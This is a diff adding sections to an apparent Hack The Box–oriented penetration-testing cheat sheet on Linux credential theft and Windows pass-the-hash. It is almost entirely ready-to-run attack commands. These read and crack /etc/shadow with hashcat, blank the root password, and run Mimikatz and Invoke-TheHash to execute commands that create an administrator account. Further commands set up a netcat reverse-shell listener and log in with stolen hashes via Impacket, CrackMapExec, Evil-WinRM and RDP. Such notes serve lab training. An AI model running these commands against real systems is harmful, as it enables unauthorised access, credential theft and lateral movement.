@@ -808,9 +808,72 @@ python3.9 firefox_decrypt.py
 ```
 
 ### Passwd, SHadow, Opasswd
+#### Passwd - Remove root or user password requirement
+```
+root::0:0:root:/root:/bin/bash
+```
+#### View Passwd,Shadow,Opasswd
+```
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/security/opasswd
+```
+#### Cracking Linux Credentials
+```
+cp /etc/passwd /tmp/passwd.bak
+cp /etc/shadow /tmp/shadow.bak
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
+```
 
 ## Windows Lateral Movement
 ### Pass the Hash
+#### Enable Restricted Admin Mode to Allow PtH
+```
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+#### Pass the Hash Using Mimikatz
+```
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+#### Invoke-Thehash with SMB
+```
+cd C:\path\to\Invoke-TheHash\
+Import-Module .\Invoke-TheHash.psd1
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+#### Start a Netcat Listener
+```
+nc.exe -lvnp 8001
+```
+#### RevShells Make a Payload
+```
+https://www.revshells.com/
+```
+#### Invoke-TheHash with WMi
+```
+Import-Module .\Invoke-TheHash.psd1
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "output from revshell"
+```
+#### Pass the Hash with Impacket
+```
+psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+#### Pass the Hash with CrackMapExec
+```
+crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+```
+#### Pass the Hash with Evil-WinRM
+```
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+#### Connect to the Machine with RDP
+```
+xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /dynamic-resolution
+```
+
 ### Pass the Ticket - Windows
 ### Pass the Ticket - Linux
 
